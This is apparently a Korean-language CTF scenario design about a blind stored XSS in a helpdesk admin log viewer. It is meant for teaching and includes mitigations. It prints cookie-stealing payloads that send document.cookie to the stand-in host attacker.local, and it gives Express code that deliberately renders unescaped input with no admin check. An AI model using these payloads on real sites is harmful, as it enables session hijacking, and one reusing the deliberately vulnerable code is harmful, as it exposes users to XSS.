---
title: Blind XSS via Out-of-Band (OOB) Session Exfiltration — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, xss, blind-xss, out-of-band, oob, session-hijacking, log-viewer]
confidence: high
---

# Blind XSS via Out-of-Band (OOB) Session Exfiltration — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Helpdesk Feedback System (헬프데스크 지원 센터)
- **난이도**: Medium-High
- **핵심 컨셉**: 공격자가 전송한 악성 페이로드가 일반 웹 서비스 화면에서는 드러나지 않다가, 내부 시스템(관리자 대시보드, 감사 로그 뷰어 등)에서 렌더링되어 실행되는 **Blind XSS (눈먼 XSS)** 취약점 문제입니다. 공격자는 문의 사항 등록 페이지(`/submit_inquiry`)를 통해 관리자에게 보낼 민감한 피드백 메시지를 전송합니다. 일반 사용자 인터페이스에서는 입력값이 필터링되거나 안전한 뷰파인더로만 조회되지만, 관리자가 로그 관제 화면에 접속할 때 관리자가 사용하는 대시보드는 보안 필터링 없이 날것의 형태로 브라우저에 텍스트를 출력합니다. 공격자는 관리자의 세션을 가로채기 위해 외부의 공격자 제어 서버로 세션 토큰 정보를 전달하는 Out-of-Band(OOB) 스크립트를 작성하여 전달합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **User Portal (`/inquiry`)**:
  - 일반 방문자가 관리자에게 문의글을 작성할 수 있는 익명 지원 폼.
- **Admin Dashboard (`/admin/logs`)**:
  - 관리자 전용 권한 세션이 있어야만 열 수 있는 내부 피드백 로깅 대시보드.
  - 사용자가 접수한 모든 문의 사항의 원본 텍스트가 표(Table) 행으로 동적 삽입되어 관리자에게 렌더링됩니다.
- **Flag 위치**:
  - 관리자 봇(Admin Bot)이 접속할 때 사용하는 관리자 계정의 세션 쿠키 값 (`admin_session=[FLAG]`) 자체 혹은 관리자 페이지 내부의 기밀 페이지 링크.

### 2.2 취약점 지점
1. **Lack of HTML Encoding in Admin Log Viewer**:
   - 일반 사용자 브라우저에서는 인코딩을 적용해 출력할 수도 있으나, 관리자 사이트 개발진은 신뢰할 수 있는 내부 DB 데이터라는 가정 하에 `dangerouslySetInnerHTML` 또는 단순한 `innerHTML` 바인딩 형태로 문의 원본 데이터를 그대로 렌더링합니다.
2. **Delayed Execution (Stored/Blind Behavior)**:
   - 페이로드가 즉시 작동하지 않고 비동기적으로 관리자가 업무 대시보드를 방문하는 시점(주기적 크론봇 동작 등)에 발화하게 됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 포맷 | 역할 |
|------------|--------|------|----------|-------------|------|
| `/submit_inquiry` | POST | 불필요 | `title`, `message` | Form Data / JSON | 일반 유저 문의 글 제출 (공격 벡터 유입점) |
| `/admin/logs` | GET | 관리자 필수 | - | HTML | 관리자 모니터링 화면 (XSS 실행 발화점) |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 문의 접수 폼 기능 진단
1. 사용자는 문의 등록 기능 `/submit_inquiry`로 일반 문의 글을 접수합니다.
2. 본인이 작성한 문의글을 상세 조회하는 기능이 사용자에게는 주어지지 않아, XSS가 자신의 화면에서 동작하는지 즉각 판단할 수 없습니다. 즉, 이 문제는 단순 Stored XSS를 넘어선 **Blind XSS** 취약점임을 인지합니다.

### Step 2. OOB 기반 XSS 스크립트 작성
관리자 브라우저에서 실행되므로, 관리자의 브라우저 쿠키를 읽어들인 뒤 공격자가 대기 중인 리시버 서버로 즉각 전송되도록 페이로드를 조율합니다.
- **XSS Payload 예시**:
  ```html
  <script>
    fetch('http://attacker.local/log?cookie=' + encodeURIComponent(document.cookie))
  </script>
  ```
  *(간혹 `<script>` 태그를 여과하는 간단한 방화벽이 존재할 경우, `<img src=x onerror="...">` 또는 `<svg/onload=...>` 등의 대체 익스플로잇 태그 적용)*

### Step 3. Blind XSS 주입 요청 송신
1. 문의 등록 엔드포인트로 악성 페이로드가 포함된 본문 문자열을 접수시킵니다.
   - **요청 파라미터**:
     `message=<svg onload="fetch('http://attacker.local/log?c='%2Bdocument.cookie)">`

### Step 4. Bot 방문 대기 및 flag 획득
1. CTF 플랫폼 내부의 시뮬레이션 관리자 봇(Admin Bot)이 주기적으로 `/admin/logs` 페이지에 접근합니다.
2. 봇의 브라우저가 관리자 대시보드 페이지를 파싱하는 과정에서 공격자가 남겨둔 `<svg onload=...>` 문법을 만나 실행됩니다.
3. 봇의 브라우저는 소유하고 있던 민감한 관리자 쿠키(`admin_session=FLAG{blind_xss_oob_session_exfiltration_success}`) 정보를 탈취하여 `attacker.local` 로그 수집기로 유출합니다.
4. 공격자는 유출된 로그 기록에서 관리자 세션 정보(Flag)를 식별합니다.

---

## 5. 취약점 유발 백엔드 및 프론트엔드 코드 스니펫

```javascript
// server.js (Node.js Express 백엔드 서버 예시)
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const app = express();
const db = new sqlite3.Database(':memory:');

app.use(express.urlencoded({ extended: true }));

db.serialize(() => {
    db.run("CREATE TABLE inquiries (id INTEGER PRIMARY KEY, title TEXT, message TEXT)");
});

// 취약점 지점 1: 사용자의 입력값에 대해 아무런 필터링 없이 그대로 데이터베이스에 저장
app.post('/submit_inquiry', (req, res) => {
    const { title, message } = req.body;
    db.run("INSERT INTO inquiries (title, message) VALUES (?, ?)", [title, message], (err) => {
        if (err) return res.sendStatus(500);
        res.send("문의가 접수되었습니다. 관리자가 확인 후 답변 드리겠습니다.");
    });
});

// 관리자용 문의 로그 뷰어 엔드포인트
app.get('/admin/logs', (req, res) => {
    // 임시 어드민 쿠키 체크 검증 생략
    db.all("SELECT * FROM inquiries", [], (err, rows) => {
        if (err) return res.sendStatus(500);
        
        let html = `<html>
        <head><title>Admin Log Control</title></head>
        <body>
        <h1>사용자 문의 내역 관리</h1>
        <table border="1">`;
        
        for (let row of rows) {
            // 취약점 지점 2: 데이터베이스에 있는 사용자 입력값을 검증/인코딩하지 않고 
            // HTML 문자열에 그대로 결합하여 출력함으로써 Blind XSS를 유발
            html += `<tr>
                <td>${row.id}</td>
                <td>${row.title}</td>
                <td>${row.message}</td>
            </tr>`;
        }
        
        html += `</table></body></html>`;
        res.send(html);
    });
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **상시적 출력 인코딩 (Context-Aware Output Encoding)**:
   - 사용자가 보낸 데이터를 화면에 표현할 때, 그것이 신뢰 영역(DB)에서 로드되었다 할지라도 반드시 HTML 엔티티(HTML Entity Encoder) 변환 과정을 거친 후 브라우저에 출력해야 합니다.
   - 예: `<` -> `&lt;`, `>` -> `&gt;` 등.
2. **콘텐츠 보안 정책 (CSP) 헤더 정의**:
   - `Content-Security-Policy` 헤더 설정을 통해 스크립트 실행이 가능한 외부 도메인을 엄격히 제어하며, 임의로 구성된 인라인 스크립트 실행(`unsafe-inline`)을 비활성화합니다.
3. **HTTPOnly 쿠키 속성 명시**:
   - 세션 식별자나 기밀 인증 값에 `HttpOnly` 속성을 추가로 활성화하여, XSS 취약점이 터지더라도 자바스크립트(`document.cookie`)를 통해 토큰 데이터 자체가 물리적으로 조회 및 유출되는 것을 일체 차단합니다.
